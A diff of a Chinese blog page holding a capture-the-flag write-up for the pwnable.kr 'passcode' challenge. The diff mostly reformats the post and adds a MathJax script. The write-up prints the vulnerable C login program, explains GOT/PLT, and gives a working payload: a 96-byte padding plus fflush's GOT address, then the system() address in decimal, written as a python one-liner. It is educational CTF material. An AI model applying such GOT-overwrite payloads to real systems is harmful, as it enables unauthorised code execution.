@@ -201,89 +201,95 @@
         </header>
 
         <div class="post-content">
-            <p><img src="/2017/09/27/Pwnable-kr-Passcode/1506517410721.jpg" alt=""></p>
+            <p><img src="/2017/09/27/Pwnable-kr-Passcode/1506517410721.jpg"></p>
 <blockquote>
-<p>初步了解linux下函数机制的一道题，过程比较艰辛 ，怕以后忘了，故此记录</p>
+<p>初步了解linux下函数机制的一道题，过程比较艰辛
+，怕以后忘了，故此记录</p>
 </blockquote>
 <a id="more"></a>
-<p>需要了解的知识</p>
-<blockquote>
-<h3 id="ELF文件函数运行机制"><a href="#ELF文件函数运行机制" class="headerlink" title="ELF文件函数运行机制"></a>ELF文件函数运行机制</h3><p><strong>PLT</strong> 表 ( Procedure Linkage  Table —过程链接表)  与<strong>GOT</strong>表 ( Global Offset Table — 全局偏移表 )</p>
-</blockquote>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目地址:ssh passcode@<a href="http://pwnable.kr" target="_blank" rel="noopener">pwnable.kr</a>:2222</p>
-<blockquote>
-<ol>
-<li>基本思路是利用脏值passcode1</li>
-<li>将name残余的数据构造成执行完scanf()函数后将要执行的函数的GOT地址</li>
-<li>然后通过<code>scanf()</code>对GOT地址进行操作,使得程序jmp到想要运行的地址或者说是函数。</li>
-</ol>
-</blockquote>
-<h1 id="大致流程图"><a href="#大致流程图" class="headerlink" title="大致流程图"></a>大致流程图</h1><p><img src="/2017/09/27/Pwnable-kr-Passcode/20-31-32.png" alt=""></p>
-<h3 id="先看源码"><a href="#先看源码" class="headerlink" title="先看源码"></a>先看源码</h3><pre><code class="lang-C">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-
-void login(){
-        int passcode1;
-        int passcode2;
-
-        printf(&quot;enter passcode1 : &quot;);
-        scanf(&quot;%d&quot;, passcode1); // 正常用法passcode1应该有取地址符&amp;
-        fflush(stdin);
-
-        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
-        printf(&quot;enter passcode2 : &quot;);
-        scanf(&quot;%d&quot;, passcode2);  // 与passcode1同样的问题
-
-        printf(&quot;checking...\n&quot;);
-        if(passcode1==338150 &amp;&amp; passcode2==13371337){
-                printf(&quot;Login OK!\n&quot;);
-                system(&quot;/bin/cat flag&quot;);
-        }
-        else{
-                printf(&quot;Login Failed!\n&quot;);
-                exit(0);
-        }
-}
-
-void welcome(){
-        char name[100];
-        printf(&quot;enter you name : &quot;);
-        scanf(&quot;%100s&quot;, name);
-        printf(&quot;Welcome %s!\n&quot;, name);
-}
-
-int main(){
-        printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);
-
-        welcome();
-        login();
-
-        // something after login...
-        printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
-        return 0;        
-}
-</code></pre>
-<p>login的scanf获取passcode1的时候没有取地址符&amp;，而且passcode1与passcode2 没有初始化，是一个<strong>脏值</strong>。<br>主函数main调用<code>welcome()</code>和<code>login()</code>;<br>Welcome()处声明了一个100字节长的char数组name;</p>
-<pre><code class="lang-C">void welcome(){
-        char name[100];
-        printf(&quot;enter you name : &quot;);
-        scanf(&quot;%100s&quot;, name);
-        printf(&quot;Welcome %s!\n&quot;, name);
-}
-</code></pre>
-<h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试:"></a>gdb调试:</h3><p>发现name的地址和passcode1的地址相差96个字节<br>我是通过本地编译,然后设置断点，查看变量地址然后相减得到的距离<br>其他大牛的wp都是看汇编看出来的</p>
-<p><img src="/2017/09/27/Pwnable-kr-Passcode/20-55-23.png" alt=""></p>
-<p><img src="/2017/09/27/Pwnable-kr-Passcode/21-16-37.png" alt=""></p>
-<p>然后说因为在main中调用了<code>welcome()</code>后立刻调用<code>login()</code>，而且均是无参数，所以ebp是一样的,故相差地址为 -0x70-(-0x10)=-96 bytes<br>现在才疏学浅，未学习win32汇编，也不知道为啥是一样的ebp，留个坑吧。</p>
-<p>name填充，然后留下构造的<code>fflush()</code>的GOT地址的大致示意图在上文，就不多说了<br>然后填充的payload即为以下，整好100字节</p>
-<pre><code class="lang-python">&#39;a&#39;*96+&#39;\x04\xa0\x04\x08&#39;
-</code></pre>
+<p>需要了解的知识 &gt; ### ELF文件函数运行机制 <strong>PLT</strong> 表 (
+Procedure Linkage Table --过程链接表) 与<strong>GOT</strong>表 ( Global
+Offset Table -- 全局偏移表 )</p>
+<h2 id="解题思路">解题思路</h2>
+<p>题目地址:ssh passcode@<a href="http://pwnable.kr" target="_blank" rel="noopener">pwnable.kr</a>:2222
+&gt; 1. 基本思路是利用脏值passcode1 &gt; 2.
+将name残余的数据构造成执行完scanf()函数后将要执行的函数的GOT地址 &gt; 3.
+然后通过<code>scanf()</code>对GOT地址进行操作,使得程序jmp到想要运行的地址或者说是函数。</p>
+<h2 id="大致流程图">大致流程图</h2>
+<p><img src="/2017/09/27/Pwnable-kr-Passcode/20-31-32.png"></p>
+<h2 id="先看源码">先看源码</h2>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> login<span class="op">(){</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> passcode1<span class="op">;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> passcode2<span class="op">;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;enter passcode1 : &quot;</span><span class="op">);</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>        scanf<span class="op">(</span><span class="st">&quot;%d&quot;</span><span class="op">,</span> passcode1<span class="op">);</span> <span class="co">// 正常用法passcode1应该有取地址符&amp;</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>        fflush<span class="op">(</span>stdin<span class="op">);</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;enter passcode2 : &quot;</span><span class="op">);</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>        scanf<span class="op">(</span><span class="st">&quot;%d&quot;</span><span class="op">,</span> passcode2<span class="op">);</span>  <span class="co">// 与passcode1同样的问题</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;checking...</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span><span class="op">(</span>passcode1<span class="op">==</span><span class="dv">338150</span> <span class="op">&amp;&amp;</span> passcode2<span class="op">==</span><span class="dv">13371337</span><span class="op">){</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>                printf<span class="op">(</span><span class="st">&quot;Login OK!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>                system<span class="op">(</span><span class="st">&quot;/bin/cat flag&quot;</span><span class="op">);</span></span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span><span class="op">{</span></span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a>                printf<span class="op">(</span><span class="st">&quot;Login Failed!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a>                exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> welcome<span class="op">(){</span></span>
+<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a>        <span class="dt">char</span> name<span class="op">[</span><span class="dv">100</span><span class="op">];</span></span>
+<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;enter you name : &quot;</span><span class="op">);</span></span>
+<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>        scanf<span class="op">(</span><span class="st">&quot;%100s&quot;</span><span class="op">,</span> name<span class="op">);</span></span>
+<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Welcome %s!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> name<span class="op">);</span></span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(){</span></span>
+<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Toddler&#39;s Secure Login System 1.0 beta.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a>        welcome<span class="op">();</span></span>
+<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a>        login<span class="op">();</span></span>
+<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a>        <span class="co">// something after login...</span></span>
+<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Now I can safely trust you that you have credential :)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span>        </span>
+<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>login的scanf获取passcode1的时候没有取地址符&amp;，而且passcode1与passcode2
+没有初始化，是一个<strong>脏值</strong>。
+主函数main调用<code>welcome()</code>和<code>login()</code>;
+Welcome()处声明了一个100字节长的char数组name;</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> welcome<span class="op">(){</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>        <span class="dt">char</span> name<span class="op">[</span><span class="dv">100</span><span class="op">];</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;enter you name : &quot;</span><span class="op">);</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>        scanf<span class="op">(</span><span class="st">&quot;%100s&quot;</span><span class="op">,</span> name<span class="op">);</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Welcome %s!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> name<span class="op">);</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<h2 id="gdb调试">gdb调试</h2>
+<p>发现name的地址和passcode1的地址相差96个字节
+我是通过本地编译,然后设置断点，查看变量地址然后相减得到的距离
+其他大牛的wp都是看汇编看出来的</p>
+<p><img src="/2017/09/27/Pwnable-kr-Passcode/20-55-23.png"></p>
+<p><img src="/2017/09/27/Pwnable-kr-Passcode/21-16-37.png"></p>
+<p>然后说因为在main中调用了<code>welcome()</code>后立刻调用<code>login()</code>，而且均是无参数，所以ebp是一样的,故相差地址为
+-0x70-(-0x10)=-96 bytes
+现在才疏学浅，未学习win32汇编，也不知道为啥是一样的ebp，留个坑吧。</p>
+<p>name填充，然后留下构造的<code>fflush()</code>的GOT地址的大致示意图在上文，就不多说了
+然后填充的payload即为以下，整好100字节</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">&#39;a&#39;</span><span class="op">*</span><span class="dv">96</span><span class="op">+</span><span class="st">&#39;</span><span class="ch">\x04\xa0\x04\x08</span><span class="st">&#39;</span></span></code></pre></div>
 <p>然后将地址<strong>0x0804a004</strong>的内容修改为<code>system()</code>的地址就大功告成了</p>
-<p><img src="/2017/09/27/Pwnable-kr-Passcode/20-55-36.jpg" alt=""><br>所以我们应该修改为<strong>0x080485e3</strong><br>因为scanf的格式是%d，所以要将0x080485e3化为十进制的134514147</p>
+<p><img src="/2017/09/27/Pwnable-kr-Passcode/20-55-36.jpg">
+所以我们应该修改为<strong>0x080485e3</strong>
+因为scanf的格式是%d，所以要将0x080485e3化为十进制的134514147</p>
 <p>所以payload修改为：</p>
-<pre><code class="lang-bash">Python -c &#39;print &quot;a&quot;*96+&quot;\x04\xa0\x04\x08&quot; +&quot;\n&quot;+&quot;134514147&quot;+&quot;\n&quot; &#39;
-</code></pre>
-<p><img src="/2017/09/27/Pwnable-kr-Passcode/20-55-41.png" alt=""></p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">Python</span> <span class="at">-c</span> <span class="st">&#39;print &quot;a&quot;*96+&quot;\x04\xa0\x04\x08&quot; +&quot;\n&quot;+&quot;134514147&quot;+&quot;\n&quot; &#39;</span></span></code></pre></div>
+<p><img src="/2017/09/27/Pwnable-kr-Passcode/20-55-41.png"></p>
 
         </div>
 
@@ -356,5 +362,20 @@ int main(){
 <script>hljs.highlightAll();</script>
 
     </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
